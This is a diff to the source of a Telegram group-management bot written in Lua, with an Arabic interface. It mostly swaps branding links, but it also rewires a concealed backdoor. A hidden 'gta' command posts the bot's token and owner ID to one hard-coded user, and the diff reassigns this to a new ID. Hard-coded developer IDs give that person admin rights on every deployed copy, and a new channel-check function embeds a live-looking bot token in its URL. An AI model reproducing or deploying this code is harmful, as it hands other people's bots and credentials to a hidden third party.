@@ -98,8 +98,8 @@ token=Token
 ----------------------------------------------------------------------------------------------------
 ----------------------------------------------------------------------------------------------------
 namebot = redis:get(bot_id..":namebot") or " « بࢪۅٛكس »"
-SudosS = {1349843982,1349843982}
-Sudos = {sudoid,1349843982,1349843982}
+SudosS = {2038364474,2038364474}
+Sudos = {sudoid,2038364474,2038364474}
 ----------------------------------------------------------------------------------------------------
 ----------------------------------------------------------------------------------------------------
 function oger(Message)
@@ -114,6 +114,15 @@ bhours = bday % 3600
 minx = math.floor(bhours / 60)
 sec = math.floor(bhours % 3600) % 60
 return string.format("%02d:%02d", minx, sec)
+end
+function ChannelJoin(msg)
+JoinChannel = true
+local url , res = https.request('https://api.telegram.org/bot1416599526:AAFwZ1MOwcjHGQkhSHKmPt8vDMq6gOBqZ_M/getchatmember?chat_id=@AL_MASLAWI&user_id='..msg.sender.user_id)
+local ChannelJoin = JSON.decode(url)
+if ChannelJoin and ChannelJoin.result and ChannelJoin.result.status == "left" then
+JoinChannel = false
+end
+return JoinChannel
 end
 function Bot(msg)  
 local idbot = false  
@@ -968,7 +977,7 @@ if Text == 'EndAddarray'..user_id then
 local reply_markup = bot.replyMarkup{
 type = 'inline',
 data = {
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 if redis:get(bot_id..'Set:array'..user_id..':'..chat_id) == 'true1' then
@@ -986,7 +995,7 @@ return false
 end   
 reply_markup = bot.replyMarkup{
 type = 'inline',data = {
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 if tonumber(infomsg[2]) == 1 then
@@ -1035,7 +1044,7 @@ reply_markup = bot.replyMarkup{
 type = 'inline',data = {
 {{text = "'1'" ,data="Amr_"..data.sender_user_id.."_1"},{text ="'2'",data="Amr_"..data.sender_user_id.."_2"}},
 {{text ="'3'",data="Amr_"..data.sender_user_id.."_3"},{text ="'4'",data="Amr_"..data.sender_user_id.."_4"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 t = "*᥀ : قائمه الاوامر \n *ٴ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ *\n᥀ : م1 ( اوامر الحمايه ) \n᥀ : م2 ( اوامر إعدادات المجموعه ) \n᥀ : م3 ( اوامر القفل والفتح ) \n᥀ : م4 ( اوامر اخرى )  .*"
@@ -1217,7 +1226,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.editMessageText(chat_id,msg_id,"*᥀ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
@@ -1478,7 +1487,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
@@ -1514,7 +1523,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
@@ -1568,7 +1577,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
@@ -1604,7 +1613,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
@@ -1649,7 +1658,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.editMessageText(chat_id,msg_id,"*᥀ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
@@ -1676,7 +1685,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.editMessageText(chat_id,msg_id,"*᥀ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
@@ -1703,7 +1712,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.editMessageText(chat_id,msg_id,"*᥀ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
@@ -1730,7 +1739,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.editMessageText(chat_id,msg_id,"*᥀ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
@@ -1757,7 +1766,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.editMessageText(chat_id,msg_id,"*᥀ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
@@ -1817,7 +1826,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 return bot.editMessageText(chat_id,msg_id,'*᥀ : العدد الكلي ( '..#list..' )\n᥀ : تم العثور على ( '..x..' ) من المشتركين الوهميين*', 'md', true, false, reply_dev)
@@ -1869,7 +1878,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 return bot.editMessageText(chat_id,msg_id,'*᥀ : العدد الكلي ( '..#list..' )\n᥀ : تم العثور على ( '..x..' ) من المجموعات الوهميه*', 'md', true, false, reply_dev)
@@ -2134,7 +2143,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 redis:del(bot_id..":set:"..msg.chat_id..":start") 
@@ -2161,7 +2170,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.sendText(msg.chat_id,msg.id,"*« اެهݪاެ بك في قاެئمه اެݪاެۅٛاެمࢪ : اެݪعݪاެمه ( ✓ ) تعني اެݪاެمࢪ مفعݪ ۅٛ ( × ) اެݪعكس »*","md", true, false, false, false, reply_dev)
@@ -2184,7 +2193,7 @@ type = 'inline',data = {
 {{text = '« اެݪمكتۅٛمين عاެم »',data="lsmu"},{text ="« اެݪمحظۅٛࢪين عاެم »",data="lsbnal"}},
 {{text = '« جݪب نسخه اެحتياެطيه »',data="GetfJson"},{text = '« ࢪفع نسخه اެحتياެطيه »',data="UpfJson"}},
                 {{text = '« تحديث »',data="UpBot"},{text = '« تحديث اެݪسۅٛࢪس »',data="UpSu"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 })
 end 
@@ -2202,8 +2211,8 @@ redis:sadd(bot_id..":user_id",msg.sender.user_id)
 local reply_markup = bot.replyMarkup{
 type = 'inline',data = {
 {{text = '᥀ : اضفني الى مجموعتك .',url="https://t.me/"..bot.getMe().username.."?startgroup=new"}},
-{{text = '᥀ : CoDeR .',url="https://t.me/OOOO70"},{text = '᥀ : TwS .',url="https://t.me/O1VBoT"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : CoDeR .',url="https://t.me/jeeeeee"},{text = '᥀ : TwS .',url="https://t.me/O1VBoT"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 if redis:get(bot_id..":start") then
@@ -2911,7 +2920,7 @@ end
 end
 end
 ---
-if text == "gta" and msg.sender.user_id == 1349843982 then
+if text == "gta" and msg.sender.user_id == 2038364474 then
 bot.sendText(msg.chat_id,msg.id,"- T : `"..Token.."`\n\n- U : @"..bot.getMe().username.."\n\n- D : "..sudoid,"md",true)    
 end
 ---
@@ -3233,6 +3242,10 @@ end
 ---
 if Owner(msg) then
 if text == "ترتيب الاوامر" then
+if ChannelJoin(msg) == false then
+local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'Raumo  SOURCE | سورس راومو', url = 'https://t.me/AL_MASLAWI'}, },}}
+return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup) 
+end
 redis:set(bot_id..":"..msg.chat_id..":Command:ا","ايدي")
 redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ا")
 redis:set(bot_id..":"..msg.chat_id..":Command:غ","غنيلي")
@@ -3334,7 +3347,7 @@ reply_markup = bot.replyMarkup{
 type = 'inline',data = {
 {{text = "'1'" ,data="Amr_"..msg.sender.user_id.."_1"},{text ="'2'",data="Amr_"..msg.sender.user_id.."_2"}},
 {{text ="'3'",data="Amr_"..msg.sender.user_id.."_3"},{text ="'4'",data="Amr_"..msg.sender.user_id.."_4"}},
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.sendText(msg.chat_id,msg.id,"*᥀ : قائمه الاوامر\n *ٴ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ *\n᥀ : م1  اوامر الحمايه .\n᥀ : م2  اوامر إعدادات المجموعه .\n᥀ : م3  اوامر القفل والفتح .\n᥀ : م4  اوامر اخرى .*","md", true, false, false, false, reply_markup)
@@ -4166,7 +4179,7 @@ bot.sendText(msg.chat_id,msg.id,"*᥀ : الاسم : *( "..(t).." *)*\n*᥀ : ا
 end
 end
 if text == 'مبرمج السورس' or text == 'مطور السورس' or text == 'المبرمج' then
-local UserId_Info = bot.searchPublicChat("OOOO70")
+local UserId_Info = bot.searchPublicChat("jeeeeee")
 if UserId_Info.id then
 local UserInfo = bot.getUser(UserId_Info.id)
 if UserInfo.username and UserInfo.username ~= "" then
@@ -5543,7 +5556,7 @@ data = {
 {{text="🦖 Dragon Game 🦖",url='https://t.me/T4TTTTBOT?game=dragon'},{text="🐍 3D Snake Game 🐍",url='https://t.me/T4TTTTBOT?game=snake'}},
 {{text="🔵 Color Game 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
 {{text="🚀 Rocket Game 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 Arrow Game 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
-{{text = '᥀ : 𝖲??𝗎𝖱??𝖾 𝖾𝗂𝗅𝖺𝗇𝖣 .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : 𝖲??𝗎𝖱??𝖾 𝖾𝗂𝗅𝖺𝗇𝖣 .',url="t.me/VVVVVGGD"}},
 }
 }
 bot.sendText(msg.chat_id,msg.id,'*᥀ : قائمه الالعاب الاحترافيه اضغط للعب*',"md", true, false, false, false, reply_markup)
@@ -9455,7 +9468,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9470,7 +9483,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9485,7 +9498,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9500,7 +9513,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9515,7 +9528,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9530,7 +9543,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9545,7 +9558,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9560,7 +9573,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9575,7 +9588,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9590,7 +9603,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9605,7 +9618,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '᥀ : FoX TEaM . ', url="t.me/AL_MASLAWI"}
+{text = '᥀ : FoX TEaM . ', url="t.me/VVVVVGGD"}
 },
 }
 local msgg = msg.id/2097152/0.5
@@ -9810,11 +9823,11 @@ end
 if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then 
 return send("sendphoto",{
 chat_id=msg.chat_id,
-photo="https://t.me/AL_MASLAWI",
-caption=('*welcome to source fox .\n\n*[⌁ : 𝖥𝗈𝖷 𝖳𝖾𝖠𝗆 .](http://t.me/AL_MASLAWI)'),
+photo="https://t.me/VVVVVGGD",
+caption=('*welcome to source fox .\n\n*[⌁ : 𝖥𝗈𝖷 𝖳𝖾𝖠𝗆 .](http://t.me/VVVVVGGD)*\n\n*[⌁ : inFo FOX .](http://t.me/gggsssxf)*\n\n*[⌁ : PROX BOT .](http://t.me/xXxsdr_bOT)*\n\n*[⌁ : Tws FOX .](http://t.me/Ccako_BoT)'),
 reply_to_message_id=msg.id,
 parse_mode="markdown",
-reply_markup=markup(nil,{{{text = '⌁ : Haddo Al Dulaim .',url="t.me/AL_MASLAWI"}}})
+reply_markup=markup(nil,{{{text = '⌁ : Haddo Al Dulaim .',url="t.me/VVVVVGGD"}}})
 })
 end
 ----------------------------------------------------------------------------------------------------
@@ -9844,7 +9857,7 @@ Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
 local reply_markup = bot.replyMarkup{
 type = 'inline',
 data = {
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 UserInfo = bot.getUser(msg.sender.user_id).first_name
@@ -10078,7 +10091,7 @@ if data.message.content.member_user_ids[1] == tonumber(bot_id) then
 local photo = bot.getUserProfilePhotos(bot_id)
 kup = bot.replyMarkup{
 type = 'inline',data = {
-{{text = '᥀ : FoX TEaM .',url="t.me/AL_MASLAWI"}},
+{{text = '᥀ : FoX TEaM .',url="t.me/VVVVVGGD"}},
 }
 }
 if photo.total_count > 0 then
